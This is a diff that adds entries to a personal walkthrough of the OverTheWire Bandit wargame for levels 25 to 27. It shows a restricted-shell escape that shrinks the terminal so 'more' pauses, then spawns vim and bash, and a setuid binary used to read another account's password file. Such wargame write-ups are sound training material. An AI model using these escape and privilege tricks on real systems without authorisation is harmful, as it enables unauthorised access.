@@ -297,3 +297,40 @@ make the script executable, and use awk to filter out previous failed attempts
 chmod +x solve25.sh
 ./solve25.sh | awk '/The password of/ {print $NF}'
 ```
+
+### level 25 -> level 26
+
+literally out of the box thinking! that's something i have never even thought of before, shrinking the terminal to abuse the limits of what a software can display to override its intended function, clever level
+
+```bash
+# figure out what shell bandit26 is running by:
+cat /etc/passwd | grep bandit26
+
+# here, it is /usr/bin/showtext
+cat /usr/bin/showtext
+# #!/bin/sh
+
+# export TERM=linux
+
+# exec more ~/text.txt
+# exit 0
+
+# so i read more about more (lmao) and took a while to observe how it needs proper space to fully execute, or it pauses
+# shrink your physical terminal window to be very small like 5 lines tall
+# log in via ssh. the custom shell will execute 'more' and pause because the screen is too small.
+ssh -i passwords/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
+
+# while paused at the --More-- prompt, press v to spawn vim
+# and the following commands get us out, had to look these up im ashamed because ive been using neovim for months and idk this ;-;
+:set shell=/bin/bash
+:shell
+```
+
+### level 26 -> level 27
+
+pretty easy, a setuid binary is given for us in home dir to run commands as bandit27, we just output the password in /etc/bandit_pass/
+
+```bash
+ls -al
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
